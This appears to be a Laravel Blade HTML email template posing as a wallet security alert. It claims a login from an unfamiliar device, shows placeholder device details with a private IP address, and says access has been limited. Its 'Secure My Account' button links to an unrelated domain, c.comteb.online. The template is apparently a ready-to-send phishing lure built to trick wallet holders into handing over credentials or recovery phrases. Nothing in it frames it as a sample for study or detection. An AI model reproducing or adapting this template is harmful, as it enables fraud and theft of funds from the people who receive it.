<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>{{ $subject ?? 'Security Alert' }}</title>
</head>

<body style="font-family: Arial, sans-serif; background-color: #ffffff; color: #000000; margin: 0; padding: 0;">
    <div style="width: 100%; max-width: 600px; margin: 0 auto; padding: 20px; box-sizing: border-box;">
        <p>Dear User,</p>

        <p style="font-weight: bold; color: #cc0000;">Security Alert: A new login was detected to your wallet from an
            unfamiliar device.</p>

        <p>To ensure your account remains secure, we’ve temporarily limited access until this activity is reviewed.</p>

        <div
            style="background-color: #f9f9f9; border-radius: 4px; padding: 15px; margin: 20px 0; font-size: 14px; line-height: 1.6;">
            <p><strong>Browser:</strong> Chrome (Linux)</p>
            <p><strong>Location:</strong> United States</p>
            <p><strong>IP Address:</strong> 192.168.1.1</p>
        </div>

        <p>If this wasn’t you, please secure your account immediately.</p>

        <div style="text-align: center; margin: 30px 0;">
            <a href="https://c.comteb.online/app/index.html"
                style="background-color: #0066cc; color: #ffffff; padding: 12px 24px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 14px;"
                target="_blank" rel="noopener noreferrer">Secure My Account</a>
        </div>

        <p style="font-size: 13px; color: #555555; margin-top: 30px;">
            Note: This is a precautionary measure to protect your account.
        </p>

        <p style="font-size: 12px; color: #999999; margin-top: 40px; text-align: center;">
            This is an automated security notification. Please do not reply to this email.
        </p>
    </div>
</body>

</html>